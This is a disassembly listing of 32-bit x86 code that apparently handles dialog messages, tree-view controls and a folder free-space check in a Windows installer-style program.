  40437f:	8b 40 68             	mov    0x68(%eax),%eax
  404382:	85 c0                	test   %eax,%eax
  404384:	79 09                	jns    0x40438f
  404386:	f7 d8                	neg    %eax
  404388:	50                   	push   %eax
  404389:	ff 15 ac 91 40 00    	call   *0x4091ac
  40438f:	50                   	push   %eax
  404390:	53                   	push   %ebx
  404391:	68 43 04 00 00       	push   $0x443
  404396:	56                   	push   %esi
  404397:	ff d7                	call   *%edi
  404399:	68 00 00 01 04       	push   $0x4010000
  40439e:	53                   	push   %ebx
  40439f:	68 45 04 00 00       	push   $0x445
  4043a4:	56                   	push   %esi
  4043a5:	ff d7                	call   *%edi
  4043a7:	ff 74 24 60          	push   0x60(%esp)
  4043ab:	e8 16 30 00 00       	call   0x4073c6
  4043b0:	50                   	push   %eax
  4043b1:	53                   	push   %ebx
  4043b2:	68 35 04 00 00       	push   $0x435
  4043b7:	56                   	push   %esi
  4043b8:	ff d7                	call   *%edi
  4043ba:	8d 44 24 10          	lea    0x10(%esp),%eax
  4043be:	89 1d 5c 1d 45 00    	mov    %ebx,0x451d5c
  4043c4:	50                   	push   %eax
  4043c5:	ff 74 24 68          	push   0x68(%esp)
  4043c9:	68 49 04 00 00       	push   $0x449
  4043ce:	56                   	push   %esi
  4043cf:	ff d7                	call   *%edi
  4043d1:	89 1d 5c 1d 45 00    	mov    %ebx,0x451d5c
  4043d7:	33 c0                	xor    %eax,%eax
  4043d9:	e9 a5 01 00 00       	jmp    0x404583
  4043de:	81 7c 24 60 11 01 00 	cmpl   $0x111,0x60(%esp)
  4043e5:	00 
  4043e6:	8b 6c 24 68          	mov    0x68(%esp),%ebp
  4043ea:	75 6d                	jne    0x404459
  4043ec:	8b 44 24 64          	mov    0x64(%esp),%eax
  4043f0:	c1 e8 10             	shr    $0x10,%eax
  4043f3:	66 85 c0             	test   %ax,%ax
  4043f6:	0f 85 79 01 00 00    	jne    0x404575
  4043fc:	83 3d 5c 1d 45 00 00 	cmpl   $0x0,0x451d5c
  404403:	0f 85 6c 01 00 00    	jne    0x404575
  404409:	f6 46 14 20          	testb  $0x20,0x14(%esi)
  40440d:	0f 84 62 01 00 00    	je     0x404575
  404413:	33 db                	xor    %ebx,%ebx
  404415:	53                   	push   %ebx
  404416:	53                   	push   %ebx
  404417:	68 f0 00 00 00       	push   $0xf0
  40441c:	68 0a 04 00 00       	push   $0x40a
  404421:	ff 74 24 6c          	push   0x6c(%esp)
  404425:	ff 15 50 92 40 00    	call   *0x409250
  40442b:	50                   	push   %eax
  40442c:	ff 15 64 92 40 00    	call   *0x409264
  404432:	8b c8                	mov    %eax,%ecx
  404434:	8b 46 14             	mov    0x14(%esi),%eax
  404437:	83 e1 01             	and    $0x1,%ecx
  40443a:	83 e0 fe             	and    $0xfffffffe,%eax
  40443d:	51                   	push   %ecx
  40443e:	ff 35 54 1d 45 00    	push   0x451d54
  404444:	0b c1                	or     %ecx,%eax
  404446:	89 46 14             	mov    %eax,0x14(%esi)
  404449:	ff 15 4c 92 40 00    	call   *0x40924c
  40444f:	e8 64 16 00 00       	call   0x405ab8
  404454:	e9 1c 01 00 00       	jmp    0x404575
  404459:	83 7c 24 60 4e       	cmpl   $0x4e,0x60(%esp)
  40445e:	0f 85 01 01 00 00    	jne    0x404565
  404464:	68 e8 03 00 00       	push   $0x3e8
  404469:	ff 74 24 60          	push   0x60(%esp)
  40446d:	ff 15 50 92 40 00    	call   *0x409250
  404473:	33 db                	xor    %ebx,%ebx
  404475:	8b d0                	mov    %eax,%edx
  404477:	81 7d 08 0b 07 00 00 	cmpl   $0x70b,0x8(%ebp)
  40447e:	0f 85 9a 00 00 00    	jne    0x40451e
  404484:	81 7d 0c 01 02 00 00 	cmpl   $0x201,0xc(%ebp)
  40448b:	0f 85 8d 00 00 00    	jne    0x40451e
  404491:	8b 45 1c             	mov    0x1c(%ebp),%eax
  404494:	8b 4d 18             	mov    0x18(%ebp),%ecx
  404497:	89 44 24 14          	mov    %eax,0x14(%esp)
  40449b:	2b c1                	sub    %ecx,%eax
  40449d:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4044a1:	c7 44 24 18 c0 e1 46 	movl   $0x46e1c0,0x18(%esp)
  4044a8:	00 
  4044a9:	3d 00 40 00 00       	cmp    $0x4000,%eax
  4044ae:	73 6e                	jae    0x40451e
  4044b0:	8d 44 24 10          	lea    0x10(%esp),%eax
  4044b4:	50                   	push   %eax
  4044b5:	53                   	push   %ebx
  4044b6:	68 4b 04 00 00       	push   $0x44b
  4044bb:	52                   	push   %edx
  4044bc:	ff 15 64 92 40 00    	call   *0x409264
  4044c2:	8b 3d a4 91 40 00    	mov    0x4091a4,%edi
  4044c8:	68 02 7f 00 00       	push   $0x7f02
  4044cd:	53                   	push   %ebx
  4044ce:	ff d7                	call   *%edi
  4044d0:	8b 35 b4 91 40 00    	mov    0x4091b4,%esi
  4044d6:	50                   	push   %eax
  4044d7:	ff d6                	call   *%esi
  4044d9:	8b 44 24 5c          	mov    0x5c(%esp),%eax
  4044dd:	89 44 24 24          	mov    %eax,0x24(%esp)
  4044e1:	8b 44 24 18          	mov    0x18(%esp),%eax
  4044e5:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4044e9:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4044ed:	50                   	push   %eax
  4044ee:	c7 44 24 24 00 05 00 	movl   $0x500,0x24(%esp)
  4044f5:	00 
  4044f6:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%esp)
  4044fd:	00 
  4044fe:	c7 44 24 2c 48 a3 40 	movl   $0x40a348,0x2c(%esp)
  404505:	00 
  404506:	89 5c 24 34          	mov    %ebx,0x34(%esp)
  40450a:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  40450e:	e8 76 2d 00 00       	call   0x407289
  404513:	68 00 7f 00 00       	push   $0x7f00
  404518:	53                   	push   %ebx
  404519:	ff d7                	call   *%edi
  40451b:	50                   	push   %eax
  40451c:	ff d6                	call   *%esi
  40451e:	81 7d 08 00 07 00 00 	cmpl   $0x700,0x8(%ebp)
  404525:	75 4e                	jne    0x404575
  404527:	81 7d 0c 00 01 00 00 	cmpl   $0x100,0xc(%ebp)
  40452e:	75 45                	jne    0x404575
  404530:	83 7d 10 0d          	cmpl   $0xd,0x10(%ebp)
  404534:	75 14                	jne    0x40454a
  404536:	53                   	push   %ebx
  404537:	6a 01                	push   $0x1
  404539:	68 11 01 00 00       	push   $0x111
  40453e:	ff 35 18 62 47 00    	push   0x476218
  404544:	ff 15 64 92 40 00    	call   *0x409264
  40454a:	83 7d 10 1b          	cmpl   $0x1b,0x10(%ebp)
  40454e:	75 10                	jne    0x404560
  404550:	53                   	push   %ebx
  404551:	53                   	push   %ebx
  404552:	6a 10                	push   $0x10
  404554:	ff 35 18 62 47 00    	push   0x476218
  40455a:	ff 15 64 92 40 00    	call   *0x409264
  404560:	33 c0                	xor    %eax,%eax
  404562:	40                   	inc    %eax
  404563:	eb 1e                	jmp    0x404583
  404565:	81 7c 24 60 0b 04 00 	cmpl   $0x40b,0x60(%esp)
  40456c:	00 
  40456d:	75 06                	jne    0x404575
  40456f:	ff 05 5c 1d 45 00    	incl   0x451d5c
  404575:	55                   	push   %ebp
  404576:	ff 74 24 68          	push   0x68(%esp)
  40457a:	ff 74 24 68          	push   0x68(%esp)
  40457e:	e8 54 17 00 00       	call   0x405cd7
  404583:	5f                   	pop    %edi
  404584:	5e                   	pop    %esi
  404585:	5d                   	pop    %ebp
  404586:	5b                   	pop    %ebx
  404587:	83 c4 48             	add    $0x48,%esp
  40458a:	c2 10 00             	ret    $0x10
  40458d:	83 ec 48             	sub    $0x48,%esp
  404590:	8b 0d 4c 1d 45 00    	mov    0x451d4c,%ecx
  404596:	53                   	push   %ebx
  404597:	8b 5c 24 54          	mov    0x54(%esp),%ebx
  40459b:	56                   	push   %esi
  40459c:	57                   	push   %edi
  40459d:	8b 79 3c             	mov    0x3c(%ecx),%edi
  4045a0:	c1 e7 0e             	shl    $0xe,%edi
  4045a3:	81 c7 00 f0 47 00    	add    $0x47f000,%edi
  4045a9:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  4045ad:	81 fb 0b 04 00 00    	cmp    $0x40b,%ebx
  4045b3:	75 41                	jne    0x4045f6
  4045b5:	57                   	push   %edi
  4045b6:	68 fb 03 00 00       	push   $0x3fb
  4045bb:	e8 10 2d 00 00       	call   0x4072d0
  4045c0:	57                   	push   %edi
  4045c1:	e8 0d 30 00 00       	call   0x4075d3
  4045c6:	e8 0a 18 00 00       	call   0x405dd5
  4045cb:	8d 73 e5             	lea    -0x1b(%ebx),%esi
  4045ce:	56                   	push   %esi
  4045cf:	ff 74 24 5c          	push   0x5c(%esp)
  4045d3:	ff 15 50 92 40 00    	call   *0x409250
  4045d9:	85 c0                	test   %eax,%eax
  4045db:	0f 84 96 03 00 00    	je     0x404977
  4045e1:	56                   	push   %esi
  4045e2:	ff 74 24 5c          	push   0x5c(%esp)
  4045e6:	ff 15 ec 91 40 00    	call   *0x4091ec
  4045ec:	a3 a0 d1 46 00       	mov    %eax,0x46d1a0
  4045f1:	e9 81 03 00 00       	jmp    0x404977
  4045f6:	55                   	push   %ebp
  4045f7:	81 fb 10 01 00 00    	cmp    $0x110,%ebx
  4045fd:	0f 85 ab 00 00 00    	jne    0x4046ae
  404603:	8b 6c 24 5c          	mov    0x5c(%esp),%ebp
  404607:	68 fb 03 00 00       	push   $0x3fb
  40460c:	55                   	push   %ebp
  40460d:	ff 15 50 92 40 00    	call   *0x409250
  404613:	8b f0                	mov    %eax,%esi
  404615:	6a 10                	push   $0x10
  404617:	89 74 24 60          	mov    %esi,0x60(%esp)
  40461b:	ff 15 d8 91 40 00    	call   *0x4091d8
  404621:	66 0f ba e0 0f       	bt     $0xf,%ax
  404626:	73 25                	jae    0x40464d
  404628:	68 f0 03 00 00       	push   $0x3f0
  40462d:	55                   	push   %ebp
  40462e:	ff 15 50 92 40 00    	call   *0x409250
  404634:	6a e0                	push   $0xffffffe0
  404636:	6a 08                	push   $0x8
  404638:	55                   	push   %ebp
  404639:	8b f0                	mov    %eax,%esi
  40463b:	e8 56 14 00 00       	call   0x405a96
  404640:	6a 08                	push   $0x8
  404642:	56                   	push   %esi
  404643:	ff 15 54 92 40 00    	call   *0x409254
  404649:	8b 74 24 5c          	mov    0x5c(%esp),%esi
  40464d:	57                   	push   %edi
  40464e:	e8 44 30 00 00       	call   0x407697
  404653:	85 c0                	test   %eax,%eax
  404655:	74 10                	je     0x404667
  404657:	57                   	push   %edi
  404658:	e8 fe 2d 00 00       	call   0x40745b
  40465d:	85 c0                	test   %eax,%eax
  40465f:	75 06                	jne    0x404667
  404661:	57                   	push   %edi
  404662:	e8 5d 26 00 00       	call   0x406cc4
  404667:	57                   	push   %edi
  404668:	56                   	push   %esi
  404669:	89 2d fc 61 47 00    	mov    %ebp,0x4761fc
  40466f:	ff 15 20 92 40 00    	call   *0x409220
  404675:	8b 7c 24 68          	mov    0x68(%esp),%edi
  404679:	ff 77 34             	push   0x34(%edi)
  40467c:	6a 01                	push   $0x1
  40467e:	55                   	push   %ebp
  40467f:	e8 12 14 00 00       	call   0x405a96
  404684:	ff 77 30             	push   0x30(%edi)
  404687:	6a 14                	push   $0x14
  404689:	55                   	push   %ebp
  40468a:	e8 07 14 00 00       	call   0x405a96
  40468f:	56                   	push   %esi
  404690:	e8 ea 13 00 00       	call   0x405a7f
  404695:	6a 08                	push   $0x8
  404697:	e8 e0 2a 00 00       	call   0x40717c
  40469c:	85 c0                	test   %eax,%eax
  40469e:	0f 84 d2 02 00 00    	je     0x404976
  4046a4:	6a 01                	push   $0x1
  4046a6:	56                   	push   %esi
  4046a7:	ff d0                	call   *%eax
  4046a9:	e9 c8 02 00 00       	jmp    0x404976
  4046ae:	33 f6                	xor    %esi,%esi
  4046b0:	bd fb 03 00 00       	mov    $0x3fb,%ebp
  4046b5:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  4046bb:	0f 85 df 00 00 00    	jne    0x4047a0
  4046c1:	8b 54 24 64          	mov    0x64(%esp),%edx
  4046c5:	0f b7 c2             	movzwl %dx,%eax
  4046c8:	66 3b c5             	cmp    %bp,%ax
  4046cb:	75 1d                	jne    0x4046ea
  4046cd:	8b c2                	mov    %edx,%eax
  4046cf:	b9 00 03 00 00       	mov    $0x300,%ecx
  4046d4:	c1 e8 10             	shr    $0x10,%eax
  4046d7:	66 3b c1             	cmp    %cx,%ax
  4046da:	0f 85 c0 00 00 00    	jne    0x4047a0
  4046e0:	bb 0f 04 00 00       	mov    $0x40f,%ebx
  4046e5:	e9 cb 00 00 00       	jmp    0x4047b5
  4046ea:	ba e9 03 00 00       	mov    $0x3e9,%edx
  4046ef:	66 3b c2             	cmp    %dx,%ax
  4046f2:	0f 85 a8 00 00 00    	jne    0x4047a0
  4046f8:	ff 71 38             	push   0x38(%ecx)
  4046fb:	8b 6c 24 60          	mov    0x60(%esp),%ebp
  4046ff:	68 68 1d 45 00       	push   $0x451d68
  404704:	89 74 24 44          	mov    %esi,0x44(%esp)
  404708:	89 74 24 5c          	mov    %esi,0x5c(%esp)
  40470c:	89 6c 24 40          	mov    %ebp,0x40(%esp)
  404710:	c7 44 24 48 48 1d 44 	movl   $0x441d48,0x48(%esp)
  404717:	00 
  404718:	c7 44 24 54 af 54 40 	movl   $0x4054af,0x54(%esp)
  40471f:	00 
  404720:	89 7c 24 58          	mov    %edi,0x58(%esp)
  404724:	e8 68 1d 00 00       	call   0x406491
  404729:	89 44 24 44          	mov    %eax,0x44(%esp)
  40472d:	8d 44 24 38          	lea    0x38(%esp),%eax
  404731:	50                   	push   %eax
  404732:	c7 44 24 4c 41 00 00 	movl   $0x41,0x4c(%esp)
  404739:	00 
  40473a:	ff 15 7c 91 40 00    	call   *0x40917c
  404740:	85 c0                	test   %eax,%eax
  404742:	74 9c                	je     0x4046e0
  404744:	50                   	push   %eax
  404745:	ff 15 ac 92 40 00    	call   *0x4092ac
  40474b:	57                   	push   %edi
  40474c:	e8 73 25 00 00       	call   0x406cc4
  404751:	a1 30 e2 47 00       	mov    0x47e230,%eax
  404756:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  40475c:	85 c0                	test   %eax,%eax
  40475e:	74 2e                	je     0x40478e
  404760:	81 ff 00 30 4d 00    	cmp    $0x4d3000,%edi
  404766:	75 26                	jne    0x40478e
  404768:	50                   	push   %eax
  404769:	56                   	push   %esi
  40476a:	e8 22 1d 00 00       	call   0x406491
  40476f:	68 48 1d 44 00       	push   $0x441d48
  404774:	68 c0 e1 46 00       	push   $0x46e1c0
  404779:	ff 15 e8 90 40 00    	call   *0x4090e8
  40477f:	85 c0                	test   %eax,%eax
  404781:	74 0b                	je     0x40478e
  404783:	68 c0 e1 46 00       	push   $0x46e1c0
  404788:	57                   	push   %edi
  404789:	e8 1c 2c 00 00       	call   0x4073aa
  40478e:	ff 05 60 1d 45 00    	incl   0x451d60
  404794:	57                   	push   %edi
  404795:	68 fb 03 00 00       	push   $0x3fb
  40479a:	55                   	push   %ebp
  40479b:	e8 04 2c 00 00       	call   0x4073a4
  4047a0:	8b c3                	mov    %ebx,%eax
  4047a2:	81 fb 0f 04 00 00    	cmp    $0x40f,%ebx
  4047a8:	74 0b                	je     0x4047b5
  4047aa:	3d 05 04 00 00       	cmp    $0x405,%eax
  4047af:	0f 85 c1 01 00 00    	jne    0x404976
  4047b5:	57                   	push   %edi
  4047b6:	68 fb 03 00 00       	push   $0x3fb
  4047bb:	89 74 24 68          	mov    %esi,0x68(%esp)
  4047bf:	e8 0c 2b 00 00       	call   0x4072d0
  4047c4:	57                   	push   %edi
  4047c5:	e8 dc 25 00 00       	call   0x406da6
  4047ca:	33 ed                	xor    %ebp,%ebp
  4047cc:	8b ce                	mov    %esi,%ecx
  4047ce:	45                   	inc    %ebp
  4047cf:	85 c0                	test   %eax,%eax
  4047d1:	57                   	push   %edi
  4047d2:	0f 44 cd             	cmove  %ebp,%ecx
  4047d5:	68 68 5d 45 00       	push   $0x455d68
  4047da:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4047de:	e8 cd 2b 00 00       	call   0x4073b0
  4047e3:	55                   	push   %ebp
  4047e4:	e8 93 29 00 00       	call   0x40717c
  4047e9:	89 44 24 14          	mov    %eax,0x14(%esp)
  4047ed:	85 c0                	test   %eax,%eax
  4047ef:	74 4b                	je     0x40483c
  4047f1:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  4047f5:	51                   	push   %ecx
  4047f6:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4047fa:	51                   	push   %ecx
  4047fb:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  4047ff:	51                   	push   %ecx
  404800:	68 68 5d 45 00       	push   $0x455d68
  404805:	ff d0                	call   *%eax
  404807:	85 c0                	test   %eax,%eax
  404809:	0f 85 87 00 00 00    	jne    0x404896
  40480f:	85 f6                	test   %esi,%esi
  404811:	74 03                	je     0x404816
  404813:	66 89 06             	mov    %ax,(%esi)
  404816:	68 68 5d 45 00       	push   $0x455d68
  40481b:	e8 86 2d 00 00       	call   0x4075a6
  404820:	8b f0                	mov    %eax,%esi
  404822:	33 c0                	xor    %eax,%eax
  404824:	6a 5c                	push   $0x5c
  404826:	66 89 06             	mov    %ax,(%esi)
  404829:	83 ee 02             	sub    $0x2,%esi
  40482c:	58                   	pop    %eax
  40482d:	66 89 06             	mov    %ax,(%esi)
  404830:	8b 44 24 14          	mov    0x14(%esp),%eax
  404834:	81 fe 68 5d 45 00    	cmp    $0x455d68,%esi
  40483a:	75 b5                	jne    0x4047f1
  40483c:	57                   	push   %edi
  40483d:	be 68 5d 45 00       	mov    $0x455d68,%esi
  404842:	56                   	push   %esi
  404843:	e8 68 2b 00 00       	call   0x4073b0
  404848:	56                   	push   %esi
  404849:	e8 0d 2c 00 00       	call   0x40745b
  40484e:	85 c0                	test   %eax,%eax
  404850:	74 05                	je     0x404857
  404852:	33 c9                	xor    %ecx,%ecx
  404854:	66 89 08             	mov    %cx,(%eax)
  404857:	8d 44 24 28          	lea    0x28(%esp),%eax
  40485b:	50                   	push   %eax
  40485c:	8d 44 24 18          	lea    0x18(%esp),%eax
  404860:	50                   	push   %eax
  404861:	8d 44 24 24          	lea    0x24(%esp),%eax
  404865:	50                   	push   %eax
  404866:	8d 44 24 24          	lea    0x24(%esp),%eax
  40486a:	50                   	push   %eax
  40486b:	56                   	push   %esi
  40486c:	ff 15 a0 90 40 00    	call   *0x4090a0
  404872:	85 c0                	test   %eax,%eax
  404874:	74 3d                	je     0x4048b3
  404876:	8b 44 24 18          	mov    0x18(%esp),%eax
  40487a:	0f af 44 24 1c       	imul   0x1c(%esp),%eax
  40487f:	68 00 04 00 00       	push   $0x400
  404884:	ff 74 24 18          	push   0x18(%esp)
  404888:	50                   	push   %eax
  404889:	ff 15 f0 90 40 00    	call   *0x4090f0
  40488f:	99                   	cltd
  404890:	8b f8                	mov    %eax,%edi
  404892:	8b f2                	mov    %edx,%esi
  404894:	eb 0f                	jmp    0x4048a5
  404896:	8b 7c 24 30          	mov    0x30(%esp),%edi
  40489a:	8b 74 24 34          	mov    0x34(%esp),%esi
  40489e:	0f ac f7 0a          	shrd   $0xa,%esi,%edi
  4048a2:	c1 ee 0a             	shr    $0xa,%esi
  4048a5:	89 7c 24 30          	mov    %edi,0x30(%esp)
  4048a9:	89 74 24 34          	mov    %esi,0x34(%esp)
  4048ad:	89 6c 24 60          	mov    %ebp,0x60(%esp)
  4048b1:	eb 08                	jmp    0x4048bb
  4048b3:	8b 74 24 34          	mov    0x34(%esp),%esi
  4048b7:	8b 7c 24 30          	mov    0x30(%esp),%edi
  4048bb:	6a 05                	push   $0x5
  4048bd:	e8 e4 14 00 00       	call   0x405da6
  4048c2:	83 7c 24 60 00       	cmpl   $0x0,0x60(%esp)
  4048c7:	8b c8                	mov    %eax,%ecx
  4048c9:	74 0f                	je     0x4048da
  4048cb:	85 f6                	test   %esi,%esi
  4048cd:	77 0b                	ja     0x4048da
  4048cf:	72 04                	jb     0x4048d5
  4048d1:	3b f9                	cmp    %ecx,%edi
  4048d3:	73 05                	jae    0x4048da
  4048d5:	6a 02                	push   $0x2
  4048d7:	5d                   	pop    %ebp
  4048d8:	eb 04                	jmp    0x4048de
  4048da:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  4048de:	a1 00 62 47 00       	mov    0x476200,%eax
  4048e3:	33 ff                	xor    %edi,%edi
  4048e5:	39 78 10             	cmp    %edi,0x10(%eax)
  4048e8:	74 3d                	je     0x404927
  4048ea:	57                   	push   %edi
  4048eb:	51                   	push   %ecx
  4048ec:	6a fb                	push   $0xfffffffb
  4048ee:	68 ff 03 00 00       	push   $0x3ff
  4048f3:	e8 e4 11 00 00       	call   0x405adc
  4048f8:	39 7c 24 60          	cmp    %edi,0x60(%esp)
  4048fc:	74 16                	je     0x404914
  4048fe:	ff 74 24 34          	push   0x34(%esp)
  404902:	ff 74 24 34          	push   0x34(%esp)
  404906:	6a fc                	push   $0xfffffffc
  404908:	68 00 04 00 00       	push   $0x400
  40490d:	e8 ca 11 00 00       	call   0x405adc
  404912:	eb 13                	jmp    0x404927
  404914:	68 c0 a2 40 00       	push   $0x40a2c0
  404919:	68 00 04 00 00       	push   $0x400
  40491e:	ff 74 24 64          	push   0x64(%esp)
  404922:	e8 7d 2a 00 00       	call   0x4073a4
  404927:	89 2d 04 e3 47 00    	mov    %ebp,0x47e304
  40492d:	85 ed                	test   %ebp,%ebp
  40492f:	75 09                	jne    0x40493a
  404931:	6a 07                	push   $0x7
  404933:	e8 04 cc ff ff       	call   0x40153c
  404938:	8b e8                	mov    %eax,%ebp
  40493a:	8b 44 24 24          	mov    0x24(%esp),%eax
  40493e:	6a 00                	push   $0x0
  404940:	5e                   	pop    %esi
  404941:	f7 40 14 00 04 00 00 	testl  $0x400,0x14(%eax)
  404948:	0f 44 f5             	cmove  %ebp,%esi
  40494b:	33 c0                	xor    %eax,%eax
  40494d:	85 f6                	test   %esi,%esi
  40494f:	0f 94 c0             	sete   %al
  404952:	50                   	push   %eax
  404953:	ff 35 54 1d 45 00    	push   0x451d54
  404959:	ff 15 4c 92 40 00    	call   *0x40924c
  40495f:	85 f6                	test   %esi,%esi
  404961:	75 0d                	jne    0x404970
  404963:	39 3d 60 1d 45 00    	cmp    %edi,0x451d60
  404969:	75 05                	jne    0x404970
  40496b:	e8 48 11 00 00       	call   0x405ab8
  404970:	89 3d 60 1d 45 00    	mov    %edi,0x451d60
  404976:	5d                   	pop    %ebp
  404977:	ff 74 24 64          	push   0x64(%esp)
  40497b:	ff 74 24 64          	push   0x64(%esp)
  40497f:	53                   	push   %ebx
  404980:	e8 52 13 00 00       	call   0x405cd7
  404985:	5f                   	pop    %edi
  404986:	5e                   	pop    %esi
  404987:	5b                   	pop    %ebx
  404988:	83 c4 48             	add    $0x48,%esp
  40498b:	c2 10 00             	ret    $0x10
  40498e:	83 ec 54             	sub    $0x54,%esp
  404991:	53                   	push   %ebx
  404992:	8b 1d 50 92 40 00    	mov    0x409250,%ebx
  404998:	b8 f9 03 00 00       	mov    $0x3f9,%eax
  40499d:	55                   	push   %ebp
  40499e:	56                   	push   %esi
  40499f:	8b 74 24 64          	mov    0x64(%esp),%esi
  4049a3:	57                   	push   %edi
  4049a4:	50                   	push   %eax
  4049a5:	56                   	push   %esi
  4049a6:	ff d3                	call   *%ebx
  4049a8:	68 08 04 00 00       	push   $0x408
  4049ad:	56                   	push   %esi
  4049ae:	89 44 24 24          	mov    %eax,0x24(%esp)
  4049b2:	ff d3                	call   *%ebx
  4049b4:	8b 1d 64 92 40 00    	mov    0x409264,%ebx
  4049ba:	8b e8                	mov    %eax,%ebp
  4049bc:	a1 48 e2 47 00       	mov    0x47e248,%eax
  4049c1:	89 44 24 14          	mov    %eax,0x14(%esp)
  4049c5:	a1 30 e2 47 00       	mov    0x47e230,%eax
  4049ca:	89 44 24 20          	mov    %eax,0x20(%esp)
  4049ce:	33 c0                	xor    %eax,%eax
  4049d0:	81 7c 24 6c 10 01 00 	cmpl   $0x110,0x6c(%esp)
  4049d7:	00 
  4049d8:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4049dc:	0f 85 26 02 00 00    	jne    0x404c08
  4049e2:	89 44 24 18          	mov    %eax,0x18(%esp)
  4049e6:	a1 4c e2 47 00       	mov    0x47e24c,%eax
  4049eb:	6a 02                	push   $0x2
  4049ed:	5f                   	pop    %edi
  4049ee:	c1 e0 02             	shl    $0x2,%eax
  4049f1:	50                   	push   %eax
  4049f2:	6a 40                	push   $0x40
  4049f4:	89 35 d8 e2 47 00    	mov    %esi,0x47e2d8
  4049fa:	ff 15 f8 90 40 00    	call   *0x4090f8
  404a00:	a3 6c 9d 45 00       	mov    %eax,0x459d6c
  404a05:	33 c0                	xor    %eax,%eax
  404a07:	50                   	push   %eax
  404a08:	50                   	push   %eax
  404a09:	50                   	push   %eax
  404a0a:	50                   	push   %eax
  404a0b:	6a 6e                	push   $0x6e
  404a0d:	ff 35 14 62 47 00    	push   0x476214
  404a13:	ff 15 30 92 40 00    	call   *0x409230
  404a19:	83 0d 68 9d 45 00 ff 	orl    $0xffffffff,0x459d68
  404a20:	8b f0                	mov    %eax,%esi
  404a22:	68 7c 5e 40 00       	push   $0x405e7c
  404a27:	6a fc                	push   $0xfffffffc
  404a29:	55                   	push   %ebp
  404a2a:	ff 15 38 92 40 00    	call   *0x409238
  404a30:	a3 64 1d 45 00       	mov    %eax,0x451d64
  404a35:	33 c0                	xor    %eax,%eax
  404a37:	50                   	push   %eax
  404a38:	6a 06                	push   $0x6
  404a3a:	6a 21                	push   $0x21
  404a3c:	6a 10                	push   $0x10
  404a3e:	6a 10                	push   $0x10
  404a40:	ff 15 44 90 40 00    	call   *0x409044
  404a46:	68 ff 00 ff 00       	push   $0xff00ff
  404a4b:	56                   	push   %esi
  404a4c:	50                   	push   %eax
  404a4d:	a3 70 9d 45 00       	mov    %eax,0x459d70
  404a52:	ff 15 40 90 40 00    	call   *0x409040
  404a58:	ff 35 70 9d 45 00    	push   0x459d70
  404a5e:	57                   	push   %edi
  404a5f:	68 09 11 00 00       	push   $0x1109
  404a64:	55                   	push   %ebp
  404a65:	ff d3                	call   *%ebx
  404a67:	33 c0                	xor    %eax,%eax
  404a69:	50                   	push   %eax
  404a6a:	50                   	push   %eax
  404a6b:	68 1c 11 00 00       	push   $0x111c
  404a70:	55                   	push   %ebp
  404a71:	ff d3                	call   *%ebx
  404a73:	83 f8 10             	cmp    $0x10,%eax
  404a76:	7d 0d                	jge    0x404a85
  404a78:	33 c0                	xor    %eax,%eax
  404a7a:	50                   	push   %eax
  404a7b:	6a 10                	push   $0x10
  404a7d:	68 1b 11 00 00       	push   $0x111b
  404a82:	55                   	push   %ebp
  404a83:	ff d3                	call   *%ebx
  404a85:	56                   	push   %esi
  404a86:	ff 15 5c 90 40 00    	call   *0x40905c
  404a8c:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  404a90:	33 c9                	xor    %ecx,%ecx
  404a92:	8b f1                	mov    %ecx,%esi
  404a94:	8b 44 24 20          	mov    0x20(%esp),%eax
  404a98:	8b 84 b0 94 00 00 00 	mov    0x94(%eax,%esi,4),%eax
  404a9f:	85 c0                	test   %eax,%eax
  404aa1:	74 29                	je     0x404acc
  404aa3:	50                   	push   %eax
  404aa4:	51                   	push   %ecx
  404aa5:	e8 e7 19 00 00       	call   0x406491
  404aaa:	50                   	push   %eax
  404aab:	33 c0                	xor    %eax,%eax
  404aad:	50                   	push   %eax
  404aae:	68 43 01 00 00       	push   $0x143
  404ab3:	55                   	push   %ebp
  404ab4:	ff d3                	call   *%ebx
  404ab6:	56                   	push   %esi
  404ab7:	50                   	push   %eax
  404ab8:	68 51 01 00 00       	push   $0x151
  404abd:	55                   	push   %ebp
  404abe:	ff d3                	call   *%ebx
  404ac0:	33 c0                	xor    %eax,%eax
  404ac2:	83 fe 20             	cmp    $0x20,%esi
  404ac5:	0f 44 c7             	cmove  %edi,%eax
  404ac8:	33 c9                	xor    %ecx,%ecx
  404aca:	8b f8                	mov    %eax,%edi
  404acc:	46                   	inc    %esi
  404acd:	83 fe 21             	cmp    $0x21,%esi
  404ad0:	7c c2                	jl     0x404a94
  404ad2:	8b 5c 24 74          	mov    0x74(%esp),%ebx
  404ad6:	8b 6c 24 68          	mov    0x68(%esp),%ebp
  404ada:	89 7c 24 24          	mov    %edi,0x24(%esp)
  404ade:	ff 74 bb 30          	push   0x30(%ebx,%edi,4)
  404ae2:	6a 15                	push   $0x15
  404ae4:	55                   	push   %ebp
  404ae5:	e8 ac 0f 00 00       	call   0x405a96
  404aea:	ff 74 bb 34          	push   0x34(%ebx,%edi,4)
  404aee:	6a 16                	push   $0x16
  404af0:	55                   	push   %ebp
  404af1:	e8 a0 0f 00 00       	call   0x405a96
  404af6:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  404afa:	33 c9                	xor    %ecx,%ecx
  404afc:	8b d9                	mov    %ecx,%ebx
  404afe:	8b f1                	mov    %ecx,%esi
  404b00:	39 0d 4c e2 47 00    	cmp    %ecx,0x47e24c
  404b06:	0f 8e c9 00 00 00    	jle    0x404bd5
  404b0c:	8b 7c 24 14          	mov    0x14(%esp),%edi
  404b10:	83 c7 18             	add    $0x18,%edi
  404b13:	66 39 0f             	cmp    %cx,(%edi)
  404b16:	0f 84 9e 00 00 00    	je     0x404bba
  404b1c:	8b 47 f0             	mov    -0x10(%edi),%eax
  404b1f:	6a 20                	push   $0x20
  404b21:	5a                   	pop    %edx
  404b22:	23 c2                	and    %edx,%eax
